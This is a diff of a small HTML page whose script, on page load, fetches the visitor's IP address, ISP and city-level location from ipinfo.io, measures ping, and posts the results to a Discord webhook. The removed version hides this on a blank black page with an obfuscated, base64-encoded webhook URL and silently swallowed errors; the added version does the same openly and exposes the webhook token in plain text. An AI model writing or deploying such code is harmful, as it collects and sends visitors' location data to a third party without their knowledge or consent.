@@ -1,46 +1,49 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>.</title>
+  <title>Network Info Sender</title>
 </head>
-<body style="background:#000;color:#000">
+<body>
+  <h1>Sending...</h1>
 
-<script>
-(function(){
-  const _0xw = [
-    "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2MjcwOTkyNzE3NTkxNzcwMy9JSENTMkh uQ0t3RHZuaFMyTERmQVlLZWRSYnhKelJyUmN0TWtucXBtMlhPWnZLekwzYkE4R2l1NDByU24tNFRP OE1PR A==",
-    "https://ipinfo.io/json",
-    "https://cloudflare.com/cdn-cgi/trace",
-    "no-store",
-    "POST",
-    "application/json"
-  ];
+  <script>
+    // ⚠️ This is your webhook. Only use temporarily!
+    const webhookURL = "https://discord.com/api/webhooks/1462709927175917703/IHCS2HnCKwDvnhS2LDfAYKedRbxJzBrRctMknqpm2XOZvKzL3bA8Giu40rSn-4TO8MOD";
 
-  const _hook = atob(_0xw[0].replace(/\s/g,""));
+    async function sendNetworkInfo() {
+      try {
+        // Fetch IP + ISP + location
+        const ipRes = await fetch("https://ipinfo.io/json");
+        const ipData = await ipRes.json();
 
-  (async () => {
-    try {
-      const _ip = await fetch(_0xw[1]).then(r => r.json());
-      const _t = performance.now();
-      await fetch(_0xw[2], { cache: _0xw[3] });
-      const _p = Math.round(performance.now() - _t);
+        // Measure approximate ping
+        const start = performance.now();
+        await fetch("https://cloudflare.com/cdn-cgi/trace", { cache: "no-store" });
+        const ping = Math.round(performance.now() - start);
 
-      await fetch(_hook, {
-        method: _0xw[4],
-        headers: { "Content-Type": _0xw[5] },
-        body: JSON.stringify({
-          content:
-`📡 **Network Info**
-IP: ${_ip.ip}
-ISP: ${_ip.org}
-Location: ${_ip.city}, ${_ip.region}, ${_ip.country}
-Ping: ${_p} ms`
-        })
-      });
-    } catch(e){}
-  })();
-})();
-</script>
+        // Prepare Discord message
+        const payload = {
+          content: `📡 **Network Info**
+**IP:** ${ipData.ip}
+**ISP:** ${ipData.org}
+**Location:** ${ipData.city}, ${ipData.region}, ${ipData.country}
+**Ping:** ${ping} ms`
+        };
 
+        // Send data to Discord webhook
+        await fetch(webhookURL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+
+        console.log("Network info sent successfully!");
+      } catch (err) {
+        console.error("Failed to send network info:", err);
+      }
+    }
+
+    sendNetworkInfo();
+  </script>
 </body>
 </html>
